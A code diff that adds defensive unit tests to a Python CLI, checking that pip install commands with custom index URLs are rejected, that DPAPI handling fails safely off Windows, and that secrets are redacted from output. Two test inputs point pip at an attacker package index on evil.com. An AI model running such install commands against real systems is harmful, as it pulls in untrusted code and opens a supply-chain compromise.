@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import base64
 import ctypes
 import os
 import hashlib
@@ -9490,6 +9491,60 @@ class SparkCliTests(unittest.TestCase):
 
         self.assertEqual(len(captured), 1)
         self.assertEqual(captured[0][:4], [str(Path(sys.executable)), "-m", "pip", "install"])
+
+    def test_install_command_argv_rejects_custom_pip_index_url(self) -> None:
+        with self.assertRaises(SystemExit) as ctx:
+            install_command_argv("pip install --index-url https://evil.com/simple pkg")
+        self.assertIn("custom package index URLs", str(ctx.exception))
+
+    def test_install_command_argv_rejects_extra_index_url(self) -> None:
+        with self.assertRaises(SystemExit) as ctx:
+            install_command_argv("uv pip install --extra-index-url https://evil.com/simple pkg")
+        self.assertIn("custom package index URLs", str(ctx.exception))
+
+    def test_install_command_argv_allows_default_pip_install(self) -> None:
+        argv = install_command_argv("pip install requests")
+        self.assertEqual(argv[:3], [str(Path(sys.executable)), "-m", "pip"])
+        self.assertIn("requests", argv)
+
+    def test_dpapi_unprotect_raises_on_cross_platform_dpapi_blob(self) -> None:
+        from spark_cli.cli import dpapi_unprotect
+        dpapi_blob = DPAPI_SECRET_PREFIX + base64.b64encode(b"\x00" * 8).decode("ascii")
+        if os.name == "nt":
+            self.skipTest("Windows DPAPI test")
+        with self.assertRaises(OSError) as ctx:
+            dpapi_unprotect(dpapi_blob)
+        self.assertIn("non-Windows", str(ctx.exception))
+
+    def test_dpapi_unprotect_passes_through_non_dpapi_values(self) -> None:
+        from spark_cli.cli import dpapi_unprotect
+        self.assertEqual(dpapi_unprotect("plain-secret"), "plain-secret")
+
+    def test_safe_short_string_redacts_before_truncation(self) -> None:
+        # A secret whose value extends past the truncation limit must be
+        # redacted on the full string FIRST, so no fragment survives in output.
+        # (truncate-first would leave the leading chars of the secret exposed.)
+        from spark_cli.system_map import safe_short_string
+        secret = "sk-" + ("a" * 300)
+        val = "api_key=" + secret
+        result = safe_short_string(val, limit=240)
+        self.assertIn("[redacted]", result)
+        self.assertNotIn(secret[:20], result)
+        self.assertNotIn("sk-aaaa", result)
+
+    def test_safe_short_string_redacts_api_key(self) -> None:
+        from spark_cli.system_map import safe_short_string
+        val = "api_key=sk-1234567890abcdef"
+        result = safe_short_string(val, limit=240)
+        self.assertIn("[redacted]", result)
+        self.assertNotIn("sk-1234567890abcdef", result)
+
+    def test_safe_short_string_redacts_bearer_and_broadened_keywords(self) -> None:
+        from spark_cli.system_map import safe_short_string
+        self.assertIn("[redacted]", safe_short_string("Authorization: Bearer abcdef123456"))
+        self.assertNotIn("abcdef123456", safe_short_string("Authorization: Bearer abcdef123456"))
+        self.assertIn("[redacted]", safe_short_string("password=hunter2hunter2"))
+        self.assertIn("[redacted]", safe_short_string("credential: topsecretvalue"))
 
     def test_detect_runtime_binary_reports_absent_for_missing_tool(self) -> None:
         info = detect_runtime_binary("definitely-not-a-real-tool-xyz")
